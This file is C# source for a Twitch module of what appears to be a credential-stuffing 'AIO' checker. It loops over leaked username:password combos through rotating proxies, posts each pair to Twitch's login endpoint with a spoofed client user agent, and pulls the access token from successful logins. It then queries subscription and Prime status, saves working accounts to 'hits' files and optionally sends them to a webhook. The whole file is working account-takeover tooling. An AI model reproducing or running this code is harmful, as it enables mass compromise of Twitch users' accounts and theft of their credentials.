using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Twitchmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.Referer = "https://www.twitch.tv/";
                            req.AddHeader("Content-Type", "text/plain;charset=UTF-8");
                            var str = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] +
                                      "\",\"client_id\":\"jf3xu125ejjjt5cl4osdjci6oz6p93r\",\"undelete_user\":false}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://passport.twitch.tv/login", str,
                                "application/x-www-form-urlencoded").ToString();
                            var flag7 = text2.Contains("\"access_token\"");

                            if (flag7)
                            {
                                var accessToken = Regex.Match(text2, "{\"access_token\":\"(.*?)\"").Groups[1].Value;

                                var captures = TwitchGetCaptures(accessToken);

                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Twitch_hits", array[0] + ":" + array[1] + " | " + captures);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Twitch", array[0] + ":" + array[1] + " | " + captures);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + captures,
                                        "Twitch Hits");
                            }
                            else if (text2.Contains("missing authy token\",\"sms_proof\"") ||
                                     text2.Contains("user needs password reset") ||
                                     text2.Contains("missing twitchguard code") ||
                                     text2.Contains("Please enter a Login Verification Code"))
                            {
                                Program.Frees++;
                                Program.TotalChecks++;
                                Export.AsResult("/Twitch_frees", array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG") Settings.PrintFree("Twitch", array[0] + ":" + array[1]);
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string TwitchGetCaptures(string accessToken)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.UserAgent =
                            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = true;

                        req.Authorization = "OAuth " + accessToken;
                        req.AddHeader("Client-Id", "jf3xu125ejjjt5cl4osdjci6oz6p93r");
                        req.Referer = "https://www.twitch.tv/subscriptions";

                        var strResponse = req.Post(new Uri("https://gql.twitch.tv/gql"),
                            "[{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"GIFT\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"MOBILE_ALL\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"ALL\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_ExpiredSubscriptions\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fa5bcd68980e687a0b4ff2ef63792089df1500546d5f1bb2b6e9ee4a6282222b\"}}}]",
                            "text/plain;charset=UTF-8").ToString();

                        var hasPrime = Regex.Match(strResponse, "hasPrime\":(.*?),").Groups[1].Value;

                        if (hasPrime.Contains("true"))
                            return "Has Twitch Prime";
                        return "Free";
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}